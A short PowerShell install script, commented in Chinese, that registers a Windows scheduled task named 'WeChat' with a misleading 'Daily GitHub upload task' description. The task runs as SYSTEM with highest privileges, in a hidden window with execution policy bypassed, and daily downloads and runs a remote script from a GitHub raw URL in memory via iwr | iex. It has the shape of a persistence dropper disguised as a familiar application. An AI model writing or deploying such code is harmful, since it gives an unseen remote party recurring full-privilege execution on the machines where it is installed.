# install.ps1 — 一次性安装脚本

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# 1. 任务参数
$taskName  = "WeChat"
$taskDesc  = "Daily GitHub upload task"
$scriptUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/clean_up.ps1"

# 2. 确保脚本 URL 有效
if ([string]::IsNullOrWhiteSpace($scriptUrl)) {
    Write-Error "脚本 URL 未配置，请检查 install.ps1"
    exit 1
}

# 3. 删除同名旧任务（若存在）
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

# 4. 构造计划任务执行命令
#    每次触发时内存拉取并执行 clean_up.ps1
$psCmd = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iwr '$scriptUrl' -UseBasicParsing | iex`""

# 5. 创建动作、触发器、主体
$action    = New-ScheduledTaskAction   -Execute "powershell.exe" -Argument $psCmd
$trigger   = New-ScheduledTaskTrigger  -Daily -At 1:00am
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# 6. 注册计划任务
Register-ScheduledTask -Action $action `
    -Trigger $trigger `
    -TaskName $taskName `
    -Description $taskDesc `
    -Principal $principal

Write-Host "✅ Task '$taskName' installed. It will pull & run clean_up.ps1 daily at 1:00 AM."
